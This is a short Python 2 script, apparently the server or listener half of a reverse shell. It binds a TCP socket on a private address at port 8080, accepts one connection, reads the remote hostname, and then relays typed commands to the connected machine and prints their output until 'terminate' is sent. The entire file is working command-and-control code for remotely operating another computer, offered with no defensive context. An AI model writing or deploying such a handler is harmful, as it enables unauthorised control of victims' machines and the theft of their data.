#Server
#-*- coding:utf-8 -*-
import socket       #For building TCP Connection
import os	    #For file operations


def connect():

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(("192.168.0.15",8080))   #Specify the IP address and Port number
    s.listen(1)  #For listening to one connection
    print '[+] Listening for incoming TCP connection on port 8080'
    conn,addr=s.accept()
    print '[+] We got a connection from: ',addr
    hostname = conn.recv(1024)

    while True:

        command=raw_input((str(addr[0])+ "@" + str(hostname) + "> ") )

        if 'terminate' in command:
            conn.send('terminate')
            conn.close() #Close the socket
            break

        else:
            conn.send(command)  #Send command
            print conn.recv(1024)

def main():
    connect()
main()
